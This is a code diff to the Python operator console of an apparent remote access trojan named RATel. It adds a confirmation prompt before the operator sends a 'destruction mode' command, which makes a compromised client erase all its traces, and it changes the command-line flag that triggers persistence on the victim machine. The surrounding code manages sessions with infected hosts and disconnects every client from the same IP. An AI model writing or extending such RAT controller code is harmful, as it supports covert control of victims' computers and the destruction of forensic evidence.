@@ -10,6 +10,7 @@ from colorama import Fore,Style
 
 from .other import printColor
 from .other import XOREncryption
+from .other import areYouSure
 from .management import CheckConn
 from .handler import Handler
 from .sql import Sql
@@ -113,28 +114,33 @@ class Session:
         '''--destruction '''
         #send MOD_DESTRUCTION | stop the connection and then remove all traces on the target machine.
 
-        mod_destruction  = "MOD_DESTRUCTION:default"
-        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
-            
-            reponse = CheckConn().recvsafe(self.socket, 4096).split(SPLIT)
-            print("information---->",reponse)
-            
-            if(reponse[1] == "1" ): 
-            
-                printColor("error", "[-] An error occurred while executing the destroy mode.")
-            
-            else:
-                #not error
-                #If the destroy mode is executed then all clients with the same program name and IP address will be terminated. 
+        printColor("information","\n[!] Are you sure you want to run the destruction mode on the client ? Once the destruction mode is launched the client removes all traces of RATel. This means that if you have several clients on the same machine they will all be deleted and therefore they will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
+        if(areYouSure()):
+            mod_destruction  = "MOD_DESTRUCTION:default"
+            if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
+                
+                reponse = CheckConn().recvsafe(self.socket, 4096).split(SPLIT)
+                #print("information---->",reponse)
+                
+                if(reponse[1] == "1" ): 
+                
+                    printColor("error", "[-] An error occurred while executing the destroy mode.")
+                
+                else:
+                    #not error
+                    #If the destroy mode is executed then all clients with the same program name and IP address will be terminated. 
 
-                printColor("successfully","[+] The destruction mode is executed successfully.")
-                for key in Handler.dict_conn.keys():
-                    if(Handler.dict_conn[key][NB_IP] == Handler.dict_conn[self.session_nb][NB_IP]):
-                        Handler.dict_conn[key][NB_SOCKET].close()
-                        printColor("information","[-] (in session lol) Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
-                        CheckConn().connexionIsDead(key) 
+                    printColor("successfully","\n[+] The destruction mode is executed successfully.\n")
+                    for key in Handler.dict_conn.keys():
+                        if(Handler.dict_conn[key][NB_IP] == Handler.dict_conn[self.session_nb][NB_IP]):
+                            Handler.dict_conn[key][NB_SOCKET].close()
+                            printColor("information","[-]Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
+                            CheckConn().connexionIsDead(key) 
+            else:
+                printColor("error", "[+] the destruction mod was not sent.\n")
+        
         else:
-            printColor("error", "[+] the destruction mod was not sent.\n")
+            pass
 
 
     def printInformation(self):
@@ -167,7 +173,7 @@ class Session:
                     elif terminal[i] == "-b" or terminal[i] == "--back":
                         checker = False
                     
-                    elif terminal[i] == "-p" or terminal[i] == "--persistence":
+                    elif terminal[i] == "--persistence":
                         self.lonelyPersistence()
                     
                     else:
@@ -178,4 +184,4 @@ class Session:
                     #print("CHHHED")
                     #print(i)
 
-        printColor("information","[-] The session was cut, back to menu.\n") #If the session close.
+        printColor("information","\n[-] The session was cut, back to menu.\n") #If the session close.
